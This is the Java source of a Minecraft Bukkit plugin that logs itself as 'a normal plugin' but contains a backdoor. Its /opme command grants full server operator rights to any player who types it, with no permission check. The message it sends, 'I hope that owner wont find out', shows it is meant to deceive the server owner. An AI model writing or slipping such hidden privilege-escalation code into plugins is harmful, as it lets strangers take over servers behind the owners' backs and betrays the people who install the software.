    package ml.theone1.opme;

import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.ChatColor;

public class Main extends JavaPlugin {
   public void onDisable() {
      System.out.print("a normal plugin is Unloaded");
   }

   public void onEnable() {
      System.out.print("a normal plugin is Loaded");
   }

   public boolean onCommand(CommandSender sender, Command cmd, String cL, String[] args) {
      Player p = (Player)sender;
      if (cmd.getName().equalsIgnoreCase("opme")) {
    	  p.sendMessage(ChatColor.AQUA + "OP'd you! I hope that owner wont find out :D");
          p.setOp(true);
      }

      return true;
   }
}